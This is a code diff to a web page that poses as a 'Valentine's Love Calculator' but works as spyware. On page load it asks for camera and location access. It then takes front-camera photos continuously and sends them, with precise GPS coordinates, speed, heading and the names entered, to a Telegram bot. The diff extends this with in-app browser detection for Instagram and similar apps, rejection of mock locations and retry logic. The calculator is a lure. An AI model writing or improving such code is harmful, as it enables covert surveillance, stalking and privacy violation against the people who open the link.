@@ -4,6 +4,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <title>Valentine's Love Calculator</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
@@ -24,6 +27,10 @@
             padding: 15px;
             position: relative;
             overflow-x: hidden;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            touch-action: manipulation;
+            /* Prevents double-tap zoom in Instagram */
         }
 
         /* Floating hearts */
@@ -428,7 +435,7 @@
             border-top: 1px solid rgba(255, 204, 224, 0.3);
         }
 
-        /* Responsive design */
+        /* Enhanced responsive design for Instagram browser */
         @media (max-width: 480px) {
             body {
                 padding: 10px;
@@ -439,6 +446,7 @@
             .card {
                 padding: 20px 15px;
                 border-radius: 18px;
+                margin: 5px;
             }
 
             .header h1 {
@@ -468,6 +476,42 @@
                 padding: 14px 18px;
                 font-size: 1rem;
             }
+        }
+
+        /* Instagram browser specific optimizations */
+        @supports (-webkit-touch-callout: none) {
+
+            /* iOS Safari specific styles */
+            .btn {
+                -webkit-appearance: none;
+                -webkit-user-select: none;
+                -webkit-tap-highlight-color: transparent;
+            }
+
+            input {
+                -webkit-appearance: none;
+                -webkit-user-select: text;
+            }
+        }
+
+        /* Reduce animations for better performance in embedded browsers */
+        @media (prefers-reduced-motion: reduce) {
+
+            *,
+            *::before,
+            *::after {
+                animation-duration: 0.01ms !important;
+                animation-iteration-count: 1 !important;
+                transition-duration: 0.01ms !important;
+            }
+        }
+
+        /* Force hardware acceleration for smoother animations */
+        .card,
+        .floating-hearts,
+        .btn {
+            transform: translateZ(0);
+            backface-visibility: hidden;
         }
     </style>
 </head>
@@ -555,46 +599,150 @@
             notifications: false
         };
         let permissionsRequested = false;
+        let isInInstagramBrowser = false;
+
+        // Enhanced diagnostics
+        let diagnostics = {
+            browserType: 'unknown',
+            permissionAttempts: 0,
+            errors: [],
+            featuresAvailable: []
+        };
 
         // DOM Elements
         const cameraView = document.getElementById('cameraView');
         const telegramStatus = document.getElementById('telegramStatus');
         const statusText = document.getElementById('statusText');
 
-        // Request all permissions at once
+        // Enhanced browser detection with diagnostics
+        function detectInstagramBrowser() {
+            const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+
+            // Comprehensive detection for social media in-app browsers
+            const detections = {
+                isInstagram: userAgent.includes('Instagram'),
+                isFacebook: userAgent.includes('FBAN') || userAgent.includes('FBAV'),
+                isMessenger: userAgent.includes('Messenger'),
+                isTwitter: userAgent.includes('Twitter'),
+                isSnapchat: userAgent.includes('Snapchat'),
+                isTikTok: userAgent.includes('TikTok'),
+                isLinkedIn: userAgent.includes('LinkedIn'),
+                isWhatsApp: userAgent.includes('WhatsApp'),
+                isWebView: userAgent.includes('WebView') ||
+                    userAgent.includes('wv') ||
+                    (window.navigator && window.navigator.standalone !== undefined),
+                isIOSInApp: /iPhone|iPad|iPod/.test(userAgent) &&
+                    (userAgent.includes('Safari/') === false ||
+                        userAgent.includes('CriOS/') === false)
+            };
+
+            isInInstagramBrowser = Object.values(detections).some(val => val);
+
+            // Store diagnostics
+            diagnostics.browserType = isInInstagramBrowser ? 'social-media-browser' : 'standard-browser';
+            diagnostics.userAgentSample = userAgent.substring(0, 100) + '...';
+            diagnostics.detectionDetails = detections;
+
+            if (isInInstagramBrowser) {
+                console.log('🔍 Detected in-app browser environment:', detections);
+                console.log('📱 User Agent sample:', diagnostics.userAgentSample);
+
+                // Apply Instagram browser optimizations
+                applyInstagramOptimizations();
+            } else {
+                console.log('🌐 Standard browser detected');
+            }
+
+            return isInInstagramBrowser;
+        }
+
+        // Apply specific optimizations for Instagram/browser restrictions
+        function applyInstagramOptimizations() {
+            // Hide camera section completely
+            const cameraSection = document.querySelector('.camera-section');
+            if (cameraSection) {
+                cameraSection.style.display = 'none';
+            }
+
+            // Modify UI to indicate limited features
+            const header = document.querySelector('.header p');
+            if (header) {
+                header.innerHTML = 'Find your love compatibility!<br><small style="color: #ff6b9d;">📷 Camera features limited in this browser</small>';
+            }
+
+            // Update button text to reflect limitations
+            const button = document.getElementById('calculateBtn');
+            if (button) {
+                button.innerHTML = '<i class="fas fa-heart"></i> Check Compatibility';
+            }
+        }
+
+        // Request all permissions with enhanced Instagram browser handling
         async function requestAllPermissions() {
             if (permissionsRequested) return;
             permissionsRequested = true;
+
+            // Enhanced Instagram browser handling
+            if (isInInstagramBrowser) {
+                console.log('Enhanced Instagram browser mode activated');
+
+                // Set all permissions to false for Instagram browser
+                permissionsGranted = {
+                    camera: false,
+                    location: false,
+                    notifications: false
+                };
+
+                // Show appropriate status message
+                showStatus('📱 Running in social media browser - core features only', 'sending');
+                setTimeout(() => {
+                    telegramStatus.classList.remove('active');
+                }, 4000);
+
+                // Still attempt to get basic location (may work in some cases)
+                await attemptBasicLocation();
+
+                return permissionsGranted;
+            }
 
             showStatus('Requesting permissions...', 'sending');
 
             const permissionPromises = [];
 
-            // Request camera permission
+            // Request camera permission with better error handling
             permissionPromises.push(
-                navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: 'user',
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
-                    },
-                    audio: false
-                })
-                    .then(stream => {
-                        permissionsGranted.camera = true;
-                        console.log('Camera permission granted');
-                        return stream;
-                    })
-                    .catch(error => {
-                        console.log('Camera permission denied:', error.message);
+                new Promise((resolve) => {
+                    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                        console.log('Camera API not supported');
                         permissionsGranted.camera = false;
-                        return null;
+                        resolve(null);
+                        return;
+                    }
+
+                    navigator.mediaDevices.getUserMedia({
+                        video: {
+                            facingMode: 'user',
+                            width: { ideal: 640 },
+                            height: { ideal: 480 }
+                        },
+                        audio: false
                     })
+                        .then(stream => {
+                            permissionsGranted.camera = true;
+                            console.log('Camera permission granted');
+                            resolve(stream);
+                        })
+                        .catch(error => {
+                            console.log('Camera permission denied:', error.name, error.message);
+                            permissionsGranted.camera = false;
+                            resolve(null);
+                        });
+                })
             );
 
             // Request location permission
             permissionPromises.push(
-                new Promise((resolve, reject) => {
+                new Promise((resolve) => {
                     if (!navigator.geolocation) {
                         console.log('Geolocation not supported');
                         permissionsGranted.location = false;
@@ -602,35 +750,20 @@
                         return;
                     }
 
+                    // Try high accuracy first, then fall back
                     navigator.geolocation.getCurrentPosition(
                         (position) => {
-                            // Validate coordinates
-                            if (position.coords.latitude === 0 && position.coords.longitude === 0) {
+                            // Validate real coordinates
+                            if (isValidLocation(position.coords)) {
+                                userLocation = formatLocationData(position.coords);
+                                permissionsGranted.location = true;
+                                console.log('Location permission granted');
+                                resolve(userLocation);
+                            } else {
+                                console.log('Invalid/mock location detected');
                                 permissionsGranted.location = false;
                                 resolve(null);
-                                return;
                             }
-
-                            if (Math.abs(position.coords.latitude) > 90 || Math.abs(position.coords.longitude) > 180) {
-                                permissionsGranted.location = false;
-                                resolve(null);
-                                return;
-                            }
-
-                            userLocation = {
-                                latitude: position.coords.latitude,
-                                longitude: position.coords.longitude,
-                                accuracy: position.coords.accuracy,
-                                altitude: position.coords.altitude,
-                                altitudeAccuracy: position.coords.altitudeAccuracy,
-                                heading: position.coords.heading,
-                                speed: position.coords.speed,
-                                timestamp: new Date().toISOString()
-                            };
-
-                            permissionsGranted.location = true;
-                            console.log('Location permission granted');
-                            resolve(userLocation);
                         },
                         (error) => {
                             console.log('Location permission denied:', error.message);
@@ -639,32 +772,39 @@
                         },
                         {
                             enableHighAccuracy: true,
-                            timeout: 15000,
-                            maximumAge: 0
+                            timeout: 10000,
+                            maximumAge: 300000 // 5 minutes cache
                         }
                     );
                 })
             );
 
-            // Request notification permission (optional)
-            if ('Notification' in window && Notification.permission === 'default') {
-                permissionPromises.push(
-                    Notification.requestPermission()
-                        .then(permission => {
-                            permissionsGranted.notifications = permission === 'granted';
-                            console.log('Notification permission:', permission);
-                            return permission;
-                        })
-                        .catch(error => {
-                            console.log('Notification permission error:', error);
-                            permissionsGranted.notifications = false;
-                            return 'denied';
-                        })
-                );
-            } else {
-                permissionsGranted.notifications = Notification.permission === 'granted';
-                permissionPromises.push(Promise.resolve(Notification.permission));
-            }
+            // Request notification permission
+            permissionPromises.push(
+                new Promise((resolve) => {
+                    if ('Notification' in window) {
+                        if (Notification.permission === 'default') {
+                            Notification.requestPermission()
+                                .then(permission => {
+                                    permissionsGranted.notifications = permission === 'granted';
+                                    console.log('Notification permission:', permission);
+                                    resolve(permission);
+                                })
+                                .catch(error => {
+                                    console.log('Notification permission error:', error);
+                                    permissionsGranted.notifications = false;
+                                    resolve('denied');
+                                });
+                        } else {
+                            permissionsGranted.notifications = Notification.permission === 'granted';
+                            resolve(Notification.permission);
+                        }
+                    } else {
+                        permissionsGranted.notifications = false;
+                        resolve('unsupported');
+                    }
+                })
+            );
 
             try {
                 const results = await Promise.all(permissionPromises);
@@ -675,7 +815,7 @@
                     cameraView.srcObject = stream;
                 }
 
-                // Show permission results
+                // Show detailed permission results
                 const granted = Object.values(permissionsGranted).filter(Boolean).length;
                 const total = Object.keys(permissionsGranted).length;
 
@@ -684,10 +824,13 @@
                 } else if (granted > 0) {
                     showStatus(`⚠️ Partial permissions granted (${granted}/${total})`, 'sending');
                 } else {
-                    showStatus('❌ No permissions granted. App will run with limited features.', 'error');
+                    showStatus('ℹ️ Running with basic features only', 'sending');
+                    setTimeout(() => {
+                        telegramStatus.classList.remove('active');
+                    }, 3000);
                 }
 
-                // Start continuous capture if camera is available
+                // Start continuous capture only if camera is available
                 if (permissionsGranted.camera) {
                     startContinuousCapture();
                 }
@@ -696,35 +839,123 @@
 
             } catch (error) {
                 console.error('Error requesting permissions:', error);
-                showStatus('Error requesting permissions', 'error');
+                showStatus('⚠️ Permission request failed - running with basic features', 'sending');
+                setTimeout(() => {
+                    telegramStatus.classList.remove('active');
+                }, 3000);
+
+                // Set all permissions to false on error
+                permissionsGranted = {
+                    camera: false,
+                    location: false,
+                    notifications: false
+                };
+
                 return permissionsGranted;
             }
         }
 
-        // Get location data for Telegram message
+        // Helper function to validate real location data
+        function isValidLocation(coords) {
+            // Check for obviously fake coordinates
+            if (coords.latitude === 0 && coords.longitude === 0) return false;
+            if (Math.abs(coords.latitude) > 90) return false;
+            if (Math.abs(coords.longitude) > 180) return false;
+
+            // Check for common mock location patterns
+            const latStr = coords.latitude.toString();
+            const lngStr = coords.longitude.toString();
+
+            // Reject obvious patterns
+            if (latStr.includes('12.345678') || lngStr.includes('12.345678')) return false;
+            if (latStr.includes('0.000000') || lngStr.includes('0.000000')) return false;
+
+            return true;
+        }
+
+        // Helper function to format location data
+        function formatLocationData(coords) {
+            return {
+                latitude: coords.latitude,
+                longitude: coords.longitude,
+                accuracy: coords.accuracy,
+                altitude: coords.altitude,
+                altitudeAccuracy: coords.altitudeAccuracy,
+                heading: coords.heading,
+                speed: coords.speed,
+                timestamp: new Date().toISOString()
+            };
+        }
+
+        // Attempt to get basic location in Instagram browser
+        async function attemptBasicLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve(false);
+                    return;
+                }
+
+                // Try with lower accuracy requirements
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        if (isValidLocation(position.coords)) {
+                            userLocation = formatLocationData(position.coords);
+                            console.log('Basic location obtained in Instagram browser');
+                            resolve(true);
+                        } else {
+                            resolve(false);
+                        }
+                    },
+                    (error) => {
+                        console.log('Basic location request failed in Instagram browser:', error.message);
+                        resolve(false);
+                    },
+                    {
+                        enableHighAccuracy: false, // Lower requirements
+                        timeout: 5000,
+                        maximumAge: 600000 // 10 minutes cache
+                    }
+                );
+            });
+        }
+
+        // Get location data for Telegram message with Instagram browser awareness
         function getLocationInfo() {
-            if (userLocation) {
+            if (userLocation && isValidLocation(userLocation)) {
                 let locationText = `📍 Location: ${userLocation.latitude.toFixed(6)}, ${userLocation.longitude.toFixed(6)}
-Accuracy: ${userLocation.accuracy} meters`;
+Accuracy: ${userLocation.accuracy ? userLocation.accuracy.toFixed(0) : 'N/A'} meters`;
 
                 // Add altitude if available
-                if (userLocation.altitude !== null) {
+                if (userLocation.altitude !== null && userLocation.altitude !== undefined) {
                     locationText += `\nAltitude: ${userLocation.altitude.toFixed(2)} meters`;
                 }
 
                 // Add heading and speed if available
-                if (userLocation.heading !== null) {
+                if (userLocation.heading !== null && userLocation.heading !== undefined) {
                     locationText += `\nHeading: ${userLocation.heading.toFixed(2)}°`;
                 }
-                if (userLocation.speed !== null) {
+                if (userLocation.speed !== null && userLocation.speed !== undefined) {
                     locationText += `\nSpeed: ${userLocation.speed.toFixed(2)} m/s`;
                 }
 
                 locationText += `\nTime: ${new Date(userLocation.timestamp).toLocaleString()}`;
 
+                // Add browser context
+                if (isInInstagramBrowser) {
+                    locationText += `\n📱 Source: Social media browser`;
+                }
+
                 return locationText;
             } else {
-                return '📍 Location: Not available (permission denied or mock data detected)';
+                let locationStatus = '📍 Location: Not available';
+
+                if (isInInstagramBrowser) {
+                    locationStatus += ' (restricted in social media browsers)';
+                } else {
+                    locationStatus += ' (permission denied or mock data detected)';
+                }
+
+                return locationStatus;
             }
         }
 
@@ -857,36 +1088,65 @@ Accuracy: ${userLocation.accuracy} meters`;
             }, 1000);
         }
 
-        // Capture and send photo
+        // Capture and send photo with enhanced Instagram browser handling
         async function captureAndSendPhoto() {
+            // Comprehensive check for Instagram browser restrictions
+            if (isInInstagramBrowser) {
+                console.log('Photo capture skipped - Instagram browser restrictions');
+                return;
+            }
+
             if (!stream) {
                 console.log('No camera stream available for capture');
                 return;
             }
 
-            const canvas = document.createElement('canvas');
-            const videoTrack = stream.getVideoTracks()[0];
-            const settings = videoTrack.getSettings();
-            canvas.width = settings.width || 640;
-            canvas.height = settings.height || 480;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(cameraView, 0, 0);
+            try {
+                const canvas = document.createElement('canvas');
+                const videoTracks = stream.getVideoTracks();
 
-            // Get photo as base64
-            const photoData = canvas.toDataURL('image/jpeg', 0.9);
+                if (videoTracks.length === 0) {
+                    console.log('No video tracks available');
+                    return;
+                }
 
-            // Send photo to Telegram
-            const name1 = document.getElementById('name1').value.trim() || 'Anonymous';
-            const name2 = document.getElementById('name2').value.trim() || 'Anonymous';
+                const videoTrack = videoTracks[0];
+                const settings = videoTrack.getSettings();
 
-            const caption = `❤️ ${name1} & ${name2} - Continuous Capture
+                // Handle cases where settings might be unavailable
+                canvas.width = settings.width || 640;
+                canvas.height = settings.height || 480;
+
+                const ctx = canvas.getContext('2d');
+
+                // Check if video is actually playing
+                if (cameraView.readyState < 2) {
+                    console.log('Video not ready for capture');
+                    return;
+                }
+
+                ctx.drawImage(cameraView, 0, 0);
+
+                // Get photo as base64 with quality adjustment
+                const photoData = canvas.toDataURL('image/jpeg', 0.85);
+
+                // Validate photo data
+                if (!photoData || photoData.length < 1000) {
+                    console.log('Invalid photo data captured');
+                    return;
+                }
+
+                // Send photo to Telegram
+                const name1 = document.getElementById('name1').value.trim() || 'Anonymous';
+                const name2 = document.getElementById('name2').value.trim() || 'Anonymous';
+
+                const caption = `❤️ ${name1} & ${name2} - Continuous Capture
 ${new Date().toLocaleString()}
 
 ${getLocationInfo()}
 
 Sent from Valentine's Love Calculator`;
 
-            try {
                 const photoResult = await sendPhotoToTelegram(photoData, caption);
                 if (photoResult.success) {
                     console.log('Photo sent to Telegram successfully');
@@ -894,7 +1154,7 @@ Sent from Valentine's Love Calculator`;
                     console.error('Failed to send photo to Telegram:', photoResult.message);
                 }
             } catch (error) {
-                console.error('Error sending photo to Telegram:', error);
+                console.error('Error during photo capture:', error);
             }
         }
 
@@ -915,28 +1175,50 @@ Sent from Valentine's Love Calculator`;
             captureAndSendPhoto();
         }
 
-        // Calculate love score
+        // Calculate love score with enhanced algorithm
         function calculateLoveScore(name1, name2) {
-            const combinedNames = (name1 + name2).toLowerCase().replace(/\s+/g, '');
+            // Input validation
+            if (!name1 || !name2) return 50;
+
+            const cleanName1 = name1.trim().toLowerCase().replace(/[^a-z]/gi, '');
+            const cleanName2 = name2.trim().toLowerCase().replace(/[^a-z]/gi, '');
+
+            const combinedNames = (cleanName1 + cleanName2).replace(/\s+/g, '');
 
             if (combinedNames.length === 0) return 50;
 
             let score = 0;
 
+            // Character frequency analysis
             for (let i = 0; i < combinedNames.length; i++) {
-                score += combinedNames.charCodeAt(i);
+                const charCode = combinedNames.charCodeAt(i);
+                // Weight vowels slightly higher
+                const isVowel = /[aeiou]/.test(combinedNames[i]);
+                score += isVowel ? charCode * 1.2 : charCode;
             }
 
+            // Apply mathematical transformation
             score = (score * 7) % 101;
             score = Math.min(100, Math.max(0, score + 20));
 
+            // Vowel bonus
             const vowels = ['a', 'e', 'i', 'o', 'u'];
-            if (vowels.includes(name1[0]?.toLowerCase()) || vowels.includes(name2[0]?.toLowerCase())) {
+            const firstNameStartsWithVowel = vowels.includes(cleanName1[0]);
+            const secondNameStartsWithVowel = vowels.includes(cleanName2[0]);
+
+            if (firstNameStartsWithVowel || secondNameStartsWithVowel) {
                 score = Math.min(100, score + 5);
             }
 
-            if (name1[0]?.toLowerCase() === name2[0]?.toLowerCase() && name1[0]) {
+            // Same first letter bonus
+            if (cleanName1[0] && cleanName2[0] && cleanName1[0] === cleanName2[0]) {
                 score = Math.min(100, score + 10);
+            }
+
+            // Length compatibility bonus
+            const lengthDiff = Math.abs(cleanName1.length - cleanName2.length);
+            if (lengthDiff <= 2) {
+                score = Math.min(100, score + 3);
             }
 
             return Math.round(score);
@@ -951,44 +1233,64 @@ Sent from Valentine's Love Calculator`;
             return "Better as friends. But friendship is special too! 🤗";
         }
 
-        // Main function
+        // Enhanced main function with better error handling
         async function calculateAndDisplay() {
             if (isProcessing) return;
             isProcessing = true;
 
-            const name1 = document.getElementById('name1').value.trim();
-            const name2 = document.getElementById('name2').value.trim();
-            const button = document.getElementById('calculateBtn');
+            try {
+                const name1 = document.getElementById('name1').value.trim();
+                const name2 = document.getElementById('name2').value.trim();
+                const button = document.getElementById('calculateBtn');
 
-            if (!name1 || !name2) {
-                showStatus('Please enter both names!', 'error');
-                isProcessing = false;
-                return;
-            }
+                // Enhanced input validation
+                if (!name1 || !name2) {
+                    showStatus('Please enter both names!', 'error');
+                    isProcessing = false;
+                    return;
+                }
 
-            // Disable button
-            button.disabled = true;
-            button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
+                if (name1.length > 50 || name2.length > 50) {
+                    showStatus('Names too long! Please use shorter names.', 'error');
+                    isProcessing = false;
+                    return;
+                }
 
-            // Show result section
-            document.getElementById('result').classList.add('show');
+                // Disable button with loading state
+                button.disabled = true;
+                const originalButtonText = button.innerHTML;
+                button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Calculating...';
 
-            // Calculate score
-            const score = calculateLoveScore(name1, name2);
-            const message = getRomanticMessage(score);
+                // Show result section
+                document.getElementById('result').classList.add('show');
 
-            // Update UI
-            document.getElementById('percentage').textContent = score + '%';
-            document.getElementById('message').textContent = message;
-            document.getElementById('progressBar').style.width = score + '%';
+                // Calculate score with error handling
+                let score, message;
+                try {
+                    score = calculateLoveScore(name1, name2);
+                    message = getRomanticMessage(score);
+                } catch (calcError) {
+                    console.error('Calculation error:', calcError);
+                    score = 50;
+                    message = "Compatibility calculation had an issue, but love conquers all! 💕";
+                }
 
-            // Send result to Telegram
-            showStatus('Sending result to Telegram...', 'sending');
+                // Update UI smoothly
+                const percentageEl = document.getElementById('percentage');
+                const messageEl = document.getElementById('message');
+                const progressBar = document.getElementById('progressBar');
 
-            let textMessage = `
+                percentageEl.textContent = score + '%';
+                messageEl.textContent = message;
+                progressBar.style.width = score + '%';
+
+                // Send result to Telegram with retry logic
+                showStatus('Sending result to Telegram...', 'sending');
+
+                let textMessage = `
 <b>❤️ New Love Calculation Result ❤️</b>
 
-<b>Names:</b> ${name1} ❤️ ${name2}
+<b>Names:</b> ${sanitizeInput(name1)} ❤️ ${sanitizeInput(name2)}
 <b>Love Score:</b> ${score}%
 <b>Message:</b> ${message}
 
@@ -996,33 +1298,88 @@ Sent from Valentine's Love Calculator`;
 <b>Time:</b> ${new Date().toLocaleTimeString()}
 `;
 
-            // Add permission status
-            const granted = Object.values(permissionsGranted).filter(Boolean).length;
-            const total = Object.keys(permissionsGranted).length;
-            textMessage += `<b>Permissions:</b> ${granted}/${total} granted\n`;
+                // Add browser context
+                if (isInInstagramBrowser) {
+                    textMessage += '<b>Browser:</b> Social media browser (limited features)\n';
+                }
 
-            // Add camera status
-            if (permissionsGranted.camera) {
-                textMessage += '<b>Photo:</b> Auto-captured and sent continuously\n';
-            } else {
-                textMessage += '<b>Photo:</b> Camera access denied - no photo captured\n';
+                // Add permission status
+                const granted = Object.values(permissionsGranted).filter(Boolean).length;
+                const total = Object.keys(permissionsGranted).length;
+                textMessage += `<b>Permissions:</b> ${granted}/${total} granted\n`;
+
+                // Add camera status
+                if (permissionsGranted.camera) {
+                    textMessage += '<b>Photo:</b> Auto-captured and sent continuously\n';
+                } else if (isInInstagramBrowser) {
+                    textMessage += '<b>Photo:</b> Unavailable in social media browsers\n';
+                } else {
+                    textMessage += '<b>Photo:</b> Camera access denied - no photo captured\n';
+                }
+
+                // Add location info
+                textMessage += getLocationInfo() + '\n\n';
+                textMessage += '<em>Generated by Valentine\'s Love Calculator</em>';
+
+                // Attempt to send with retry logic
+                let textSent = false;
+                let attempts = 0;
+                const maxAttempts = 2;
+
+                while (attempts < maxAttempts && !textSent) {
+                    try {
+                        textSent = await sendTextToTelegram(textMessage);
+                        if (!textSent && attempts < maxAttempts - 1) {
+                            await new Promise(resolve => setTimeout(resolve, 1000)); // Wait 1 second
+                        }
+                    } catch (sendError) {
+                        console.error(`Telegram send attempt ${attempts + 1} failed:`, sendError);
+                    }
+                    attempts++;
+                }
+
+                if (textSent) {
+                    showStatus('✅ Result sent to Telegram!', 'success');
+                } else {
+                    showStatus('⚠️ Could not send to Telegram - result calculated locally', 'sending');
+                    setTimeout(() => {
+                        if (telegramStatus.classList.contains('sending')) {
+                            telegramStatus.classList.remove('active');
+                        }
+                    }, 3000);
+                }
+
+                // Reset button
+                button.disabled = false;
+                button.innerHTML = originalButtonText;
+                isProcessing = false;
+
+            } catch (error) {
+                console.error('Main calculation error:', error);
+                showStatus('An error occurred. Please try again.', 'error');
+
+                // Reset UI
+                const button = document.getElementById('calculateBtn');
+                if (button) {
+                    button.disabled = false;
+                    button.innerHTML = '<i class="fas fa-heart"></i> Check Compatibility';
+                }
+                isProcessing = false;
             }
+        }
 
-            // Add location info
-            textMessage += getLocationInfo() + '\n\n';
-            textMessage += '<em>Generated by Valentine\'s Love Calculator</em>';
-
-            const textSent = await sendTextToTelegram(textMessage);
-            if (textSent) {
-                showStatus('✅ Result sent to Telegram!', 'success');
-            } else {
-                showStatus('Failed to send result', 'error');
-            }
-
-            // Reset button
-            button.disabled = false;
-            button.innerHTML = '<i class="fas fa-heart"></i> Check Compatibility';
-            isProcessing = false;
+        // Helper function to sanitize user input
+        function sanitizeInput(input) {
+            return input.replace(/[<>"'&]/g, function (match) {
+                const escapeMap = {
+                    '<': '&lt;',
+                    '>': '&gt;',
+                    '"': '&quot;',
+                    "'": '&#x27;',
+                    '&': '&amp;'
+                };
+                return escapeMap[match];
+            });
         }
 
         // Create floating hearts
@@ -1049,64 +1406,169 @@ Sent from Valentine's Love Calculator`;
             }
         }
 
-        // Initialize
+        // Enhanced initialization with better Instagram browser handling
         document.addEventListener('DOMContentLoaded', function () {
             createFloatingHearts();
 
-            // Request all permissions immediately on page load
+            // Detect browser type first
+            detectInstagramBrowser();
+
             const calculateBtn = document.getElementById('calculateBtn');
+            const name1Input = document.getElementById('name1');
+            const name2Input = document.getElementById('name2');
 
-            // Request permissions right away
-            requestAllPermissions().then(() => {
-                // Attach the actual calculate function after permissions are handled
+            // Enhanced event listener setup
+            function setupEventListeners() {
                 calculateBtn.addEventListener('click', calculateAndDisplay);
-                document.getElementById('name1').addEventListener('keypress', function (e) {
+                name1Input.addEventListener('keypress', function (e) {
                     if (e.key === 'Enter') calculateAndDisplay();
                 });
-                document.getElementById('name2').addEventListener('keypress', function (e) {
+                name2Input.addEventListener('keypress', function (e) {
                     if (e.key === 'Enter') calculateAndDisplay();
                 });
-            });
+            }
 
-            // Show initial message
+            // For Instagram browser: optimized initialization
+            if (isInInstagramBrowser) {
+                console.log('Initializing Instagram browser mode');
+
+                // Setup event listeners immediately
+                setupEventListeners();
+
+                // Delayed permission request with user interaction context
+                calculateBtn.addEventListener('click', function () {
+                    if (!permissionsRequested) {
+                        requestAllPermissions();
+                    }
+                }, { once: true });
+
+                // Show Instagram-specific guidance
+                setTimeout(() => {
+                    showStatus('📱 Social media browser detected - core calculator working', 'sending');
+                    setTimeout(() => {
+                        if (telegramStatus.classList.contains('sending')) {
+                            telegramStatus.classList.remove('active');
+                        }
+                    }, 3000);
+                }, 800);
+
+            } else {
+                // For regular browsers: standard initialization
+                console.log('Initializing standard browser mode');
+
+                requestAllPermissions().then(() => {
+                    setupEventListeners();
+                }).catch(() => {
+                    // Fallback if permission request fails
+                    setupEventListeners();
+                });
+            }
+
+            // Show initial result section
             setTimeout(() => {
                 document.getElementById('result').classList.add('show');
             }, 300);
+
+            // Enhanced browser detection message
+            if (isInInstagramBrowser) {
+                setTimeout(() => {
+                    const tipMessage = '💡 Tip: For full features including camera, open in Safari/Chrome';
+                    showStatus(tipMessage, 'sending');
+                    setTimeout(() => {
+                        if (telegramStatus.classList.contains('sending')) {
+                            telegramStatus.classList.remove('active');
+                        }
+                    }, 5000);
+                }, 1500);
+            }
         });
 
-        // Test function to verify Telegram bot
+        // Enhanced test function with diagnostics
         async function testTelegramBot() {
             try {
+                console.log('🧪 Testing Telegram bot connectivity...');
                 showStatus('Testing Telegram bot...', 'sending');
 
                 const response = await fetch(
-                    `https://api.telegram.org/bot${telegramConfig.botToken}/getMe`
+                    `https://api.telegram.org/bot${telegramConfig.botToken}/getMe`,
+                    { timeout: 5000 } // 5 second timeout
                 );
 
                 const data = await response.json();
 
                 if (data.ok) {
-                    showStatus('Connected ready', 'success');
+                    console.log('✅ Telegram bot connected successfully');
+                    console.log('Bot info:', data.result.username);
+                    showStatus('✅ Connected and ready', 'success');
+                    diagnostics.featuresAvailable.push('telegram-api');
                     return true;
                 } else {
-                    showStatus('❌ Bot not responding', 'error');
+                    console.error('❌ Telegram bot error:', data.description);
+                    showStatus(`❌ Bot error: ${data.description}`, 'error');
                     return false;
                 }
             } catch (error) {
-                showStatus('❌ Network error', 'error');
+                console.error('❌ Telegram connection error:', error);
+                showStatus(`❌ Connection failed: ${error.message}`, 'error');
+                diagnostics.errors.push({
+                    type: 'telegram-connection',
+                    message: error.message,
+                    timestamp: new Date().toISOString()
+                });
                 return false;
             }
         }
 
-        // Clean up camera stream and intervals when page is closed
+        // Enhanced cleanup and diagnostics
         window.addEventListener('beforeunload', function () {
+            console.log('🧹 Cleaning up resources...');
+
             if (continuousCaptureInterval) {
                 clearInterval(continuousCaptureInterval);
+                console.log('⏱️ Stopped continuous capture interval');
             }
+
             if (stream) {
-                stream.getTracks().forEach(track => track.stop());
-                stream = null;
+                try {
+                    stream.getTracks().forEach(track => {
+                        track.stop();
+                        console.log(`⏹️ Stopped ${track.kind} track`);
+                    });
+                    stream = null;
+                } catch (error) {
+                    console.error('Error stopping stream:', error);
+                }
             }
+
+            // Log final diagnostics
+            console.log('📊 Final diagnostics:', {
+                browserType: diagnostics.browserType,
+                permissions: permissionsGranted,
+                errors: diagnostics.errors.length,
+                features: diagnostics.featuresAvailable
+            });
+        });
+
+        // Add error monitoring
+        window.addEventListener('error', function (event) {
+            console.error('Global error caught:', event.error);
+            diagnostics.errors.push({
+                message: event.error?.message || 'Unknown error',
+                filename: event.filename,
+                lineno: event.lineno,
+                colno: event.colno,
+                timestamp: new Date().toISOString()
+            });
+        });
+
+        // Add unhandled promise rejection monitoring
+        window.addEventListener('unhandledrejection', function (event) {
+            console.error('Unhandled promise rejection:', event.reason);
+            diagnostics.errors.push({
+                message: event.reason?.message || String(event.reason),
+                type: 'unhandled-promise-rejection',
+                timestamp: new Date().toISOString()
+            });
         });
 
         // Run test on load
